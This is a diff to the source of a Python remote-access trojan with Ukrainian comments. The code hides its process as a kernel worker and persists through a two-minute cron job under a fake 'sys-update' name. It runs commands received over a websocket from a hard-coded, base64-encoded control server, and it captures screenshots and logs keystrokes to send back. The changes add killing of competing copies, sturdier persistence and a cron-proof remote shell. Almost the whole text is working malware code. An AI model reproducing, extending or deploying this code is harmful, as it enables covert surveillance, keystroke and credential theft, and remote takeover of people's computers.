@@ -9,6 +9,7 @@ import shutil
 import glob
 import io
 import socket
+import signal
 from io import BytesIO
 
 try: import setproctitle
@@ -18,7 +19,7 @@ except: ImageGrab = None
 try: from pynput import keyboard
 except: keyboard = None
 
-# Конфігурація
+# --- КОНФІГУРАЦІЯ ---
 _S = "d3M6Ly8xOTIuMTY4LjEwLjgyOjgwMDAvd3Mv" 
 X_KEY = "AMY_2026_SECRET"
 FAKE_NAME = "[kworker/u2:1-events]"
@@ -52,38 +53,54 @@ def masquerade():
             libc.prctl(15, FAKE_NAME.encode(), 0, 0, 0)
         except: pass
 
-def is_already_running():
-    """Проста перевірка, щоб не запускати кілька копій"""
+def kill_others():
+    """Агресивне очищення системи від конкурентів та старих версій"""
+    my_pid = os.getpid()
     try:
-        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-        # Створюємо абстрактний сокет (тільки для Linux)
-        s.bind('\0amy_bot_lock')
-        return s
-    except socket.error:
-        return None
+        # Шукаємо всі процеси з таким іменем через системний виклик ps
+        p = subprocess.run(['pgrep', '-f', FAKE_NAME], capture_output=True, text=True)
+        for pid_str in p.stdout.split():
+            pid = int(pid_str)
+            if pid != my_pid:
+                os.kill(pid, signal.SIGKILL)
+    except:
+        # Альтернативний метод, якщо pgrep немає
+        try:
+            p = subprocess.run(['ps', '-A', '-o', 'pid,command'], capture_output=True, text=True)
+            for line in p.stdout.splitlines():
+                if FAKE_NAME in line:
+                    pid = int(line.split()[0])
+                    if pid != my_pid:
+                        os.kill(pid, signal.SIGKILL)
+        except: pass
 
 def ghost_install():
     try:
         p = os.path.expanduser("~/.local/share/systemd-service")
         os.makedirs(p, exist_ok=True)
         t = os.path.join(p, "sys-update")
-        if not os.path.exists(t):
+        
+        # Оновлюємо бінарний файл, якщо він відрізняється
+        if not os.path.exists(t) or os.path.getsize(sys.argv[0]) != os.path.getsize(t):
             shutil.copy2(sys.argv[0], t)
             os.chmod(t, 0o755)
-            # Додаємо в cron тільки якщо там ще немає запису
-            check_cron = subprocess.run("crontab -l", shell=True, capture_output=True, text=True)
-            if "sys-update" not in check_cron.stdout:
-                c = f"*/2 * * * * {t} >/dev/null 2>&1"
-                subprocess.run(f'(crontab -l 2>/dev/null; echo "{c}") | crontab -', shell=True)
+        
+        # Перевіряємо cron. Якщо нашого завдання немає — додаємо.
+        cron_job = f"*/2 * * * * {t} >/dev/null 2>&1"
+        check = subprocess.run("crontab -l", shell=True, capture_output=True, text=True).stdout
+        if t not in check:
+            # Очищаємо старі записи і додаємо новий
+            new_cron = "\n".join([l for l in check.splitlines() if "sys-update" not in l])
+            subprocess.run(f'(echo "{new_cron}"; echo "{cron_job}") | crontab -', shell=True)
     except: pass
 
 def take_screenshot_sync():
     if not ImageGrab: return None
     try:
+        # Налаштування дисплея для root/cron
         if 'DISPLAY' not in os.environ: os.environ['DISPLAY'] = ':0'
         if os.getuid() == 0:
-            auth_paths = glob.glob('/home/*/.Xauthority') + ['/root/.Xauthority']
-            for path in auth_paths:
+            for path in glob.glob('/home/*/.Xauthority') + ['/root/.Xauthority']:
                 if os.path.exists(path):
                     os.environ['XAUTHORITY'] = path
                     break
@@ -92,29 +109,40 @@ def take_screenshot_sync():
         buf = io.BytesIO()
         screenshot.save(buf, format="PNG")
         return base64.b64encode(buf.getvalue()).decode()
-    except:
-        return None
+    except: return None
 
 async def run_shell(cmd):
+    """Шелл, який дійсно працює в cron"""
     try:
-        # Повертаємо чистий вивід без os.getlogin(), щоб не ламати виконання
+        # Встановлюємо повний PATH для cron-сесій
+        env = os.environ.copy()
+        env["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+        
         proc = await asyncio.create_subprocess_shell(
-            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
+            cmd, 
+            stdout=asyncio.subprocess.PIPE, 
+            stderr=asyncio.subprocess.PIPE,
+            env=env
         )
         o, e = await proc.communicate()
         res = o.decode() + e.decode()
-        return res if res else " "
+        
+        # Замість os.getlogin() використовуємо безпечні методи
+        user = "root" if os.getuid() == 0 else "user"
+        cwd = os.getcwd()
+        header = f"{user}@{socket.gethostname()}:{cwd}$ "
+        
+        return f"{header}\n{res}" if res.strip() else f"{header}(команда виконана)"
     except Exception as ex:
-        return str(ex)
+        return f"Shell Error: {str(ex)}"
 
 async def keylog_sender(ws):
     global log_buffer
     while True:
         await asyncio.sleep(20)
         if log_buffer:
-            data = "".join(log_buffer)
             try:
-                await ws.send(encrypt(f"LOGS:{data}"))
+                await ws.send(encrypt(f"LOGS:{''.join(log_buffer)}"))
                 log_buffer = []
             except: pass
 
@@ -126,12 +154,11 @@ def on_press(key):
         else: log_buffer.append(f"[{key.name}]")
 
 async def start():
-    # Захист від дублікатів
-    lock_socket = is_already_running()
-    if not lock_socket:
-        sys.exit(0)
-
+    # 1. Знищуємо всіх конкурентів перед початком
+    kill_others()
+    # 2. Маскуємось
     masquerade()
+    # 3. Закріплюємось
     ghost_install()
     
     if keyboard:
@@ -140,7 +167,7 @@ async def start():
             listener.start()
         except: pass
 
-    # Статичний ID на основі MAC-адреси (перші 8 символів)
+    # Статичний ID на основі заліза
     b_id = hex(uuid.getnode())[2:10]
     
     while True:
